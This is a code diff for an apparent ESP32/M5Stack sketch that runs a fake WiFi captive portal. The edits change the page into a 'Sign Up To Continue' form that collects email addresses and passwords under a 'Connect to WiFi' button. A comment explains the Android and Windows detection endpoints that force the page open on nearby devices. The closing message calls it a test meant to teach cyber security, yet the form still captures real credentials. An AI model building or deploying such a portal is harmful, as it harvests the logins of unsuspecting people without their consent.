@@ -66,12 +66,12 @@ button{
 
 <div class="box">
 <h2>Welcome</h2>
-<p>Login to continue</p>
+<p>Sign Up To Continue</p>
 
 <form action="/get">
-<input type="text" name="username" placeholder="Username"><br>
-<input type="password" name="password" placeholder="Password"><br>
-<button type="submit">Login</button>
+<input type="text" name="Email" placeholder="Enter Email"><br>
+<input type="password" name="password" placeholder="Enter Password"><br>
+<button type="submit">Connect to WiFi</button>
 </form>
 
 </div>
@@ -105,6 +105,8 @@ void setupServer()
       Serial.println("Client Connected");
   });
 
+  //If certain OS's are not pushing a captive page -> This area here serves for different operating systems.
+
   // Android
   server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request)
   {
@@ -123,6 +125,8 @@ void setupServer()
     request->send(200, "text/plain", "Microsoft NCSI");
   });
   
+  /////////////////////////////////////////////
+
   //Std push
   server.on("/get", HTTP_GET, [] (AsyncWebServerRequest *request)
   {
@@ -152,7 +156,7 @@ void setupServer()
       request->redirect("/");
       });
 
-      request->send(200, "text/html", "The values entered by you have been successfully sent to the device <br><a href=\"/\">Return to Home Page</a>");
+      request->send(200, "text/html", "Hey! This was a test! This is not real Wifi! Please improve your cyber security skills :) <br><a href=\"/\">Return to Home Page</a>");
   });
 
 }
@@ -204,10 +208,6 @@ void setup()
   M5.Lcd.drawString(greeting,
                   M5.Lcd.width() / 2,
                   M5.Lcd.height() / 2 + 20);
-  M5.Lcd.setTextSize(1);
-  M5.Lcd.drawString(instrucHome,
-                  M5.Lcd.width() / 2,
-                  M5.Lcd.height() / 2 + 40);
 
   Serial.println();
   Serial.println("Setting up AP Mode");
